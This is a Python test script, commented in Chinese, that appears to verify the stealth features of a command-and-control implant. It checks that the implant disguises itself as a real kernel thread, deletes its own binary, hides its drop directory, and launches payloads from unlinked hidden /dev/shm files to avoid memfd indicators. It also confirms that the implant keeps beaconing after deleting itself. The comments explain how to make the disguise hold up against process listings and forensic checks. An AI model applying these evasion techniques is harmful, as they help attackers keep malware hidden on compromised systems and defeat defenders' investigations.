#!/usr/bin/env python3
"""P1 验收：/proc/<pid> 元数据清理（方案 §3.4 / 完全体清单 B2·B3·B4·B5·B6）

背景：长期驻留的是**代理本体**，但它的 comm / exe / cwd 此前完全裸露
（`opsec_masquerade` 只在操作员下命令时才调，`agent_main()` 启动序列一次都没调）。
P1-a 把这三项在启动期一次做完；P1-b 把载荷载体从 memfd 换成 tmpfs 文件，
消掉内核硬编码的 "/memfd:" 一级 IOC。

全部用**外部观测**判定（readlink /proc/<pid>/…）——即对手的分析手法，
不用载荷自报（那部分由 p01 覆盖）。

  T0  阳性对照：读取手段有效（同一手法读普通进程的 comm/cwd）——ISS-020 规则
  T1  comm = 本机**真实存在**的内核线程名（B2/B9），且 ≠ 可执行文件名
  T2  cmdline 与 comm 同名，且不含落地路径（B2）
  T3  exe 以 " (deleted)" 结尾 → /proc 下不再有磁盘路径（B3 / 门 S1）
  T4  cwd = "/"（不泄漏投放目录，B4）
  T5  落地文件已从磁盘消失（门 S1：磁盘零残留）
  T6  自删没把自己搞死：beacon 仍通（getuid 回执）
  T7  spawn_detached 回执报 tmpfs 路线（不是 memfd 回退）
  T8  载荷 exe = /dev/shm/.m<8hex> (deleted)，全程无 "memfd:"（B5）
  T9  载荷 maps 无 "memfd:" 且含该载体（B5）
  T10 载荷 fd 仅 0/1/2（载体 fd CLOEXEC → 不留给载荷，B6）
  T11 /dev/shm 零残留（门 S1）
"""
import os
import re
import subprocess
import sys
import time

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))
import e2e
from p01_detached_spawn import run_bof, run_cmd      # 复用：同一条 spawn_detached 通道

PL = "/tmp/p11_payload"
PL_SRC = "/tmp/p11_payload.c"
SLEEPER_C = "#include <unistd.h>\nint main(void){ sleep(180); return 0; }\n"
R = []


def real_kthread_names():
    """本机**真实存在**的内核线程名集合。判据用「cmdline 为空」——
    这正是 ps 判定内核线程、并回退到 comm 补方括号显示时的同一观测。"""
    s = set()
    for d in os.listdir("/proc"):
        if not d.isdigit():
            continue
        try:
            if os.path.getsize("/proc/%s/cmdline" % d) != 0:
                continue
            s.add(open("/proc/%s/comm" % d).read().strip())
        except OSError:
            pass
    return s


def rec(item, ok, note=""):
    R.append(bool(ok))
    print("  [%-4s] %-46s %s" % ("PASS" if ok else "FAIL", item, note), flush=True)


def sh(c):
    return subprocess.run(["bash", "-lc", c], capture_output=True, text=True).stdout.strip()


def rl(p):
    """readlink 的裸值（不存在返回空串，不抛）。"""
    return sh("readlink %s 2>/dev/null" % p)


def main():
    # ── 0. 载荷：静态 musl 睡 180s（只要活着够我们看完 /proc）──
    open(PL_SRC, "w").write(SLEEPER_C)
    if subprocess.run("musl-gcc -static -O2 -o %s %s" % (PL, PL_SRC),
                      shell=True).returncode != 0:
        print("RESULT: FAIL (musl-gcc 编译载荷失败)")
        return
    sh("rm -f /tmp/p11_*ran*")

    # ── T0 阳性对照：先证明"读 /proc 元数据"这个手段本身是有效的 ──
    bcomm = sh("bash -c 'cat /proc/self/comm'")
    bcwd = rl("/proc/self/cwd")
    rec("T0 阳性对照：comm/cwd 读取手段有效",
        bcomm == "cat" and bcwd.startswith("/"),
        "bash 的 comm=%r cwd=%r" % (bcomm, bcwd))

    binp = e2e.gen_agent("TestHTTP", "p11")
    pid = e2e.launch(binp)
    aid = e2e.wait_registered("TestHTTP", pid, timeout=90)
    print("[p11] agent id=%s pid=%d 落地=%s" % (aid, pid, binp), flush=True)

    # ── T1/T2/T3/T4：代理本体在 /proc 下的四项 ──
    time.sleep(2)
    comm = sh("cat /proc/%d/comm 2>/dev/null" % pid)
    # B9：不再是"∈ 硬编码名池"，而是"∈ 本机**真实存在**的内核线程名集合" ——
    # 直接验证设计意图。硬编码池里的 migration/1（单核机）/ ksoftirqd/3（<4 核）/
    # rcu_sched（新内核已改名）在目标机上可能根本不存在，伪装成"本机不可能有的
    # 内核线程"本身就是异常信号。
    kth = real_kthread_names()
    rec("T1 comm = 本机真实存在的内核线程名（B9）",
        comm in kth and comm != os.path.basename(binp),
        "comm=%r（本机内核线程名 %d 个；可执行文件名=%r）"
        % (comm, len(kth), os.path.basename(binp)))

    cmdline = sh("tr '\\0' ' ' < /proc/%d/cmdline 2>/dev/null" % pid).strip()
    # cmdline 是**带方括号**形式：真内核线程 cmdline 为空、ps 才回退到用 comm 补
    # 方括号显示；我们 cmdline 非空、ps 原样显示，所以方括号必须写在 argv[0] 里，
    # 否则 `ps aux` 里与真 kworker 差一个字符。comm 则不带方括号。
    rec("T2 cmdline = [comm]（与真 kworker 同形）且不含落地路径",
        cmdline == "[%s]" % comm and binp not in cmdline,
        "cmdline=%r comm=%r" % (cmdline, comm))

    exe = rl("/proc/%d/exe" % pid)
    rec("T3 exe 以 ' (deleted)' 结尾（自删成功，无磁盘路径）",
        exe.endswith(" (deleted)") and binp not in exe,
        "exe=%r" % exe)

    cwd = rl("/proc/%d/cwd" % pid)
    rec("T4 cwd = '/'（不泄漏投放目录）", cwd == "/", "cwd=%r" % cwd)

    # ── T5：S1 磁盘零残留 —— 落地文件本身必须没了 ──
    rec("T5 落地文件已从磁盘消失（门 S1）",
        not os.path.exists(binp), "exists(%s)=%s" % (binp, os.path.exists(binp)))

    # ── T6：自删不能把自己搞死 —— beacon 必须照常往返 ──
    lat = run_cmd(aid, "getuid", 90)
    rec("T6 自删后 beacon 仍通", lat is not None, "getuid 回执耗时=%ss" % lat)

    # ── T7：P1-b 载体路线（回执必须报 tmpfs，静默降级到 memfd 视为失败）──
    t7 = run_bof(aid, PL, timeout=90)
    m = re.search(r"pid=(\d+)", t7 or "")
    npid = int(m.group(1)) if m else 0
    rec("T7 spawn_detached 回执报 tmpfs 路线",
        bool(t7) and "tmpfs+exec verified" in t7 and npid > 0,
        (t7 or "<无回执>").strip().replace("\n", " | ")[:110])

    # ── T8/T9/T10：载荷在 /proc 下的三项（外部观测）──
    pexe = rl("/proc/%d/exe" % npid) if npid else ""
    rec("T8 载荷 exe = /dev/shm/.m<8hex> (deleted)，无 memfd:",
        bool(re.match(r"^/dev/shm/\.m[0-9a-f]{8} \(deleted\)$", pexe))
        and "memfd:" not in pexe,
        "exe=%r" % pexe)

    pmaps = sh("grep -c 'memfd:' /proc/%d/maps 2>/dev/null" % npid) if npid else "-"
    pmaps_hit = sh("grep -c '%s' /proc/%d/maps 2>/dev/null"
                   % (re.escape(pexe.split(" (deleted)")[0]), npid)) if pexe else "-"
    rec("T9 载荷 maps 无 memfd: 且含该载体",
        pmaps == "0" and pmaps_hit not in ("0", "", "-"),
        "maps 中 memfd: 命中=%s，载体命中=%s" % (pmaps, pmaps_hit))

    pfds = sh("ls /proc/%d/fd 2>/dev/null" % npid) if npid else ""
    rec("T10 载荷 fd 仅 0/1/2（载体 fd 未泄漏）",
        pfds.split() == ["0", "1", "2"], "fd=[%s]" % pfds.replace("\n", " "))

    # ── T11：/dev/shm 零残留（载体建完即 unlink）──
    shm = sh("ls -a /dev/shm 2>/dev/null | grep '^\\.m' || true")
    rec("T11 /dev/shm 零残留（无 .m* 文件）", shm == "", "残留=%r" % shm)

    # ── 清场：按 pid 杀，不用 pkill -f（载荷 cmdline 是 [kworker/0:1]，
    #    -f 匹配会误伤同名命令行；ISS-011 同类）──
    if npid:
        sh("kill -9 %d 2>/dev/null || true" % npid)
    e2e.kill(pid)
    sh("rm -f %s %s %s" % (PL, PL_SRC, PL + ".c"))

    print("\nPASS=%d FAIL=%d" % (R.count(True), R.count(False)))
    print("RESULT: %s" % ("PASS" if all(R) else "FAIL"))


if __name__ == "__main__":
    main()
